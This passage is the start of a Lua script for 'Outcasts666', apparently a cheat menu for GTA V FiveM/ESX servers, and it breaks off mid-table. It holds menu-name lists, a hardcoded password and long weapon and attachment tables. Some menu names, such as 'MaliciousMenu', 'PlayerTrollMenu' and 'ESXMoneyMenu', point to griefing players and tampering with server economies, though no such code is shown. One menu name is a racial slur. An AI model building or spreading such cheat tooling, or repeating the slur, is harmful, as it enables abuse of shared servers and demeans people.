
    Outcasts666 = { }

    Outcasts666.debug = false
    
    local Enabled = true
    
    local message = "~r~Welcome ~r~To ~r~Outcasts ~r~666"
    
    local logged = false
    local pass = "outcast"
    
    local animated = true
    local rainbow = false
    
    local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MODEL", "MaliciousMenu", 
                                "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu", "MiscAIDrive",
                                "TeleportMenu", "NiggerCustoms", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu", 
                                "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "MiscDrop", "MiscTriggers", "WeaponCustomization", "WeaponTintMenu",
                                "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "PerformanceMenu", "SingleWepPlayer", "SettingsMenu", "VehBoostMenu",
                                "ESXMiscMenu", "ESXDrugs", "VRPMenu", "Credits", "SpawnPedsMenu", "Themes", "CarTypeSelection" ,"CarOptions", 
                                "CarTypes", "tunings", "performance", "WeaponTypes", "WeaponTypeSelection", "WeaponOptions", "ModSelect", "primary", "secondary", 
                                "rimpaint", "classic1", "metallic1", "matte1", "metal1", "classic2", "metallic2", "matte2", "metal2", "classic3", "metallic3", 
                                "matte3", "metal3", "paint", "BlockAreas", "InfoMenu", "PlayerSpawnPedsMenu" }
    
    local currentMenuX = 1
    local selectedMenuX = 1
    local currentMenuY = 1
    local selectedMenuY = 1
    local menuX = { 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75 }
    local menuY = { 0.025, 0.1, 0.2, 0.3, 0.425 }
    
    local SelectedPlayer
    local bullets = { "WEAPON_FLAREGUN", "WEAPON_FIREWORK", "WEAPON_RPG", "WEAPON_PIPEBOMB", "WEAPON_RAILGUN", "WEAPON_SMOKEGRENADE", "VEHICLE_WEAPON_PLAYER_LASER", "VEHICLE_WEAPON_TANK" }
    local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
    local vehicles = { "Freight", "Rhino", "Futo", "Vigilante", "Monster", "Panto", "Bus", "Dump", "CargoPlane" }
    local vehicleSpeed = { 1.0, 10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0, 90.0, 100.0, 110.0, 120.0, 130.0, 140.0, 150.0 }
    
    local b0 = false
    local b1 = false
    local b2 = false
    local b3 = false
    local b4 = nil
    local b5 = {}
    local b6 = {}
    local b7 = nil
    local b8 = false
    local b9 = -1
    local ba = -1
    local bb = -1
    local bc = false
    
    local currentVehicle = 1
    local selectedVehicle = 1
    
    local currentVehicleSpeed = 16
    local selectedVehicleSpeed = 16
    
    local currentBone = 1
    local selectedBone = 1
    
    local currentDamage = 1
    local selectedDamage = 1
    
    local currentPed = 1
    local selectedPed = 1
    
    local currentBullet = 1
    local selectedBullet = 1
    
    local menus = { }
    local keys = { up = 300, down = 299, left = 308, right = 307, select = 215, back = 194 }
    local optionCount = 0
    
    local currentKey = nil
    local currentMenu = nil
    
    local titleHeight = 0.11
    local titleYOffset = 0.03
    local titleScale = 1.0
    
    local buttonHeight = 0.038
    local buttonFont = 0
    local buttonScale = 0.365
    local buttonTextXOffset = 0.005
    local buttonTextYOffset = 0.005
    
    local allWeapons = {"WEAPON_KNIFE","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE","WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_PISTOL","WEAPON_PISTOL_MK2","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_SMG_MK2","WEAPON_ASSAULTSMG","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATMG_MK2","WEAPON_COMBATPDW","WEAPON_GUSENBERG","WEAPON_MACHINEPISTOL","WEAPON_ASSAULTRIFLE","WEAPON_ASSAULTRIFLE_MK2","WEAPON_CARBINERIFLE","WEAPON_CARBINERIFLE_MK2","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_HEAVYSNIPER_MK2","WEAPON_MARKSMANRIFLE","WEAPON_GRENADELAUNCHER","WEAPON_GRENADELAUNCHER_SMOKE","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}
    
    local b7 = {
        Melee = {
            BaseballBat = {
                id = "weapon_bat", name = "∑Baseball Bat", bInfAmmo = false, mods = {}
            }, BrokenBottle = {
                id = "weapon_bottle", name = "∑Broken Bottle", bInfAmmo = false, mods = {}
            }, Crowbar = {
                id = "weapon_Crowbar", name = "∑Crowbar", bInfAmmo = false, mods = {}
            }, Flashlight = {
                id = "weapon_flashlight", name = "Flashlight", bInfAmmo = false, mods = {}
            }, GolfClub = {
                id = "weapon_golfclub", name = "∑Golf Club", bInfAmmo = false, mods = {}
            }, BrassKnuckles = {
                id = "weapon_knuckle", name = "∑Brass Knuckles", bInfAmmo = false, mods = {}
            }, Knife = {
                id = "weapon_knife", name = "∑Knife", bInfAmmo = false, mods = {}
            }, Machete = {
                id = "weapon_machete", name = "∑Machete", bInfAmmo = false, mods = {}
            }, Switchblade = {
                id = "weapon_switchblade", name = "∑Switchblade", bInfAmmo = false, mods = {}
            }, Nightstick = {
                id = "weapon_nightstick", name = "∑Nightstick", bInfAmmo = false, mods = {}
            }, BattleAxe = {
                id = "weapon_battleaxe", name = "∑Battle Axe", bInfAmmo = false, mods = {}
            }
        }, Handguns = {
            Pistol = {
                id = "weapon_pistol", name = "∑Pistol", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_PISTOL_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_PISTOL_CLIP_02"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
                        }
                    }
                }
            }, PistolMK2 = {
                id = "weapon_pistol_mk2", name = "∑Pistol MK 2", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_02"
                        }, {
                            name = "Tracer Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_TRACER"
                        }, {
                            name = "Incendiary Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Hollow Point Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"
                        }, {
                            name = "FMJ Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_FMJ"
                        }
                    }, Sights = {
                        {
                            name = "Mounted Scope", id = "COMPONENT_AT_PI_RAIL"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_PI_FLSH_02"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Compensator", id = "COMPONENT_AT_PI_COMP"
                        }, {
                            name = "Suppessor", id = "COMPONENT_AT_PI_SUPP_02"
                        }
                    }
                }
            }, CombatPistol = {
                id = "weapon_combatpistol", name = "∑Combat Pistol", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_02"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"
                        }
                    }
                }
            }, APPistol = {
                id = "weapon_appistol", name = "AP Pistol", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_APPISTOL_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_APPISTOL_CLIP_02"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"
                        }
                    }
                }
            }, StunGun = {
                id = "weapon_stungun", name = "∑Stun Gun", bInfAmmo = false, mods = {}
            }, Pistol50 = {
                id = "weapon_pistol50", name = "∑Pistol .50", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_PISTOL50_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_PISTOL50_CLIP_02"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
                        }
                    }
                }
            }, SNSPistol = {
                id = "weapon_snspistol", name = "∑SNS Pistol", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_SNSPISTOL_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_SNSPISTOL_CLIP_02"
                        }
                    }
                }
            }, SNSPistolMkII = {
                id = "weapon_snspistol_mk2", name = "∑SNS Pistol Mk II", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_02"
                        }, {
                            name = "Tracer Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"
                        }, {
                            name = "Incendiary Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Hollow Point Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"
                        }, {
                            name = "FMJ Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"
                        }
                    }, Sights = {
                        {
                            name = "Mounted Scope", id = "COMPONENT_AT_PI_RAIL_02"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_PI_FLSH_03"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Compensator", id = "COMPONENT_AT_PI_COMP_02"
                        }, {
                            name = "Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
                        }
                    }
                }
            }, HeavyPistol = {
                id = "weapon_heavypistol", name = "Heavy Pistol", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_02"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"
                        }
                    }
                }
            }, VintagePistol = {
                id = "weapon_vintagepistol", name = "∑Vintage Pistol", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_02"
                        }
                    }, BarrelAttachments = {
                        {
                            "Suppressor", id = "COMPONENT_AT_PI_SUPP"
                        }
                    }
                }
            }, FlareGun = {
                id = "weapon_flaregun", name = "∑Flare Gun", bInfAmmo = false, mods = {}
            }, MarksmanPistol = {
                id = "weapon_marksmanpistol", name = "∑Marksman Pistol", bInfAmmo = false, mods = {}
            }, HeavyRevolver = {
                id = "weapon_revolver", name = "Heavy Revolver", bInfAmmo = false, mods = {}
            }, HeavyRevolverMkII = {
                id = "weapon_revolver_mk2", name = "Heavy Revolver Mk II", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_01"
                        }, {
                            name = "Tracer Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_TRACER"
                        }, {
                            name = "Incendiary Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Hollow Point Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"
                        }, {
                            name = "FMJ Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_FMJ"
                        }
                    }, Sights = {
                        {
                            name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                        }, {
                            name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Compensator", id = "COMPONENT_AT_PI_COMP_03"
                        }
                    }
                }
            }, DoubleActionRevolver = {
                id = "weapon_doubleaction", name = "∑Double Action Revolver", bInfAmmo = false, mods = {}
            }, UpnAtomizer = {
                id = "weapon_raypistol", name = "∑Up-n-Atomizer", bInfAmmo = false, mods = {}
            }
        }, SMG = {
            MicroSMG = {
                id = "weapon_microsmg", name = "∑Micro SMG", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_MICROSMG_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_MICROSMG_CLIP_02"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_MACRO"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                        }
                    }
                }
            }, SMG = {
                id = "weapon_smg", name = "∑SMG", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_SMG_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_SMG_CLIP_02"
                        }, {
                            name = "Drum Magazine", id = "COMPONENT_SMG_CLIP_03"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_MACRO_02"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"
                        }
                    }
                }
            }, SMGMkII = {
                id = "weapon_smg_mk2", name = "∑SMG Mk II", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_SMG_MK2_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_SMG_MK2_CLIP_02"
                        }, {
                            name = "Tracer Rounds", id = "COMPONENT_SMG_MK2_CLIP_TRACER"
                        }, {
                            name = "Incendiary Rounds", id = "COMPONENT_SMG_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Hollow Point Rounds", id = "COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"
                        }, {
                            name = "FMJ Rounds", id = "COMPONENT_SMG_MK2_CLIP_FMJ"
                        }
                    }, Sights = {
                        {
                            name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS_SMG"
                        }, {
                            name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"
                        }, {
                            name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_SMG_MK2"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, Barrel = {
                        {
                            name = "Default", id = "COMPONENT_AT_SB_BARREL_01"
                        }, {
                            name = "Heavy", id = "COMPONENT_AT_SB_BARREL_02"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"
                        }, {
                            name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                        }, {
                            name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                        }, {
                            name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                        }, {
                            name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                        }, {
                            name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                        }, {
                            name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                        }, {
                            name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                        }
                    }
                }
            }, AssaultSMG = {
                id = "weapon_assaultsmg", name = "∑Assault SMG", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_02"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_MACRO"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                        }
                    }
                }
            }, CombatPDW = {
                id = "weapon_combatpdw", name = "∑Combat PDW", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_COMBATPDW_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_COMBATPDW_CLIP_02"
                        }, {
                            name = "Drum Magazine", id = "COMPONENT_COMBATPDW_CLIP_03"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_SMALL"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"
                        }
                    }
                }
            }, MachinePistol = {
                id = "weapon_machinepistol", name = "∑Machine Pistol ", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_02"
                        }, {
                            name = "Drum Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_03"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"
                        }
                    }
                }
            }, MiniSMG = {
                id = "weapon_minismg", name = "∑Mini SMG", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_MINISMG_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_MINISMG_CLIP_02"
                        }
                    }
                }
            }, UnholyHellbringer = {
                id = "weapon_raycarbine", name = "∑Unholy Hellbringer", bInfAmmo = false, mods = {}
            }
        }, Shotguns = {
            PumpShotgun = {
                id = "weapon_pumpshotgun", name = "∑Pump Shotgun", bInfAmmo = false, mods = {
                    Flashlight = {
                        {
                            "name = Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_SR_SUPP"
                        }
                    }
                }
            }, PumpShotgunMkII = {
                id = "weapon_pumpshotgun_mk2", name = "∑Pump Shotgun Mk II", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"
                        }, {
                            name = "Dragon Breath Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Steel Buckshot Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"
                        }, {
                            name = "Flechette Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"
                        }, {
                            name = "Explosive Slugs", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"
                        }
                    }, Sights = {
                        {
                            name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                        }, {
                            name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                        }, {
                            name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_SR_SUPP_03"
                        }, {
                            name = "Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"
                        }
                    }
                }
            }, SawedOffShotgun = {
                id = "weapon_sawnoffshotgun", name = "∑Sawed-Off Shotgun", bInfAmmo = false, mods = {}
            }, AssaultShotgun = {
                id = "weapon_assaultshotgun", name = "∑Assault Shotgun", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_02"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"
                        }
                    }
                }
            }, BullpupShotgun = {
                id = "weapon_bullpupshotgun", name = "∑Bullpup Shotgun", bInfAmmo = false, mods = {
                    Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"
                        }
                    }
                }
            }, Musket = {
                id = "weapon_musket", name = "∑Musket", bInfAmmo = false, mods = {}
            }, HeavyShotgun = {
                id = "weapon_heavyshotgun", name = "Heavy Shotgun", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"
                        }, {
                            name = "Drum Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"
                        }
                    }
                }
            }, DoubleBarrelShotgun = {
                id = "weapon_dbshotgun", name = "∑Double Barrel Shotgun", bInfAmmo = false, mods = {}
            }, SweeperShotgun = {
                id = "weapon_autoshotgun", name = "∑Sweeper Shotgun", bInfAmmo = false, mods = {}
            }
        }, AssaultRifles = {
            AssaultRifle = {
                id = "weapon_assaultrifle", name = "∑Assault Rifle", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_02"
                        }, {
                            name = "Drum Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_03"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_MACRO"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"
                        }
                    }
                }
            }, AssaultRifleMkII = {
                id = "weapon_assaultrifle_mk2", name = "∑Assault Rifle Mk II", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"
                        }, {
                            name = "Tracer Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"
                        }, {
                            name = "Incendiary Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Hollow Point Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"
                        }, {
                            name = "FMJ Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"
                        }
                    }, Sights = {
                        {
                            name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                        }, {
                            name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                        }, {
                            name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, Barrel = {
                        {
                            name = "Default", id = "COMPONENT_AT_AR_BARREL_01"
                        }, {
                            name = "Heavy", id = "COMPONENT_AT_AR_BARREL_0"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                        }, {
                            name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                        }, {
                            name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                        }, {
                            name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                        }, {
                            name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                        }, {
                            name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                        }, {
                            name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                        }, {
                            name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                        }
                    }
                }
            }, CarbineRifle = {
                id = "weapon_carbinerifle", name = "∑Carbine Rifle", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_02"
                        }, {
                            name = "Box Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_03"
                        }
                    }, Sights = {
                        {
                            name = "Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"
                        }
                    }, Grips = {
                        {
                            name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"
                        }
                    }
                }
            }, CarbineRifleMkII = {
                id = "weapon_carbinerifle_mk2", name = "∑Carbine Rifle Mk II ", bInfAmmo = false, mods = {
                    Magazines = {
                        {
                            name = "Default Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_01"
                        }, {
                            name = "Extended Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_02"
                        }, {
                            name = "Tracer Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"
                        }, {
                            name = "Incendiary Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"
                        }, {
                            name = "Hollow Point Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"
                        }, {
                            name = "FMJ Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"
                        }
                    }, Sights = {
                        {
                            name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                        }, {
                            name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
                        }, {
                            name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                        }
                    }, Flashlight = {
                        {
                            name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"
                        }
                    }, Barrel = {
                        {
                            name = "Default", id = "COMPONENT_AT_CR_BARREL_01"
                        }, {
                            name = "Heavy", id = "COMPONENT_AT_CR_BARREL_02"
                        }
                    }, BarrelAttachments = {
                        {
                            name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"
                        }, {
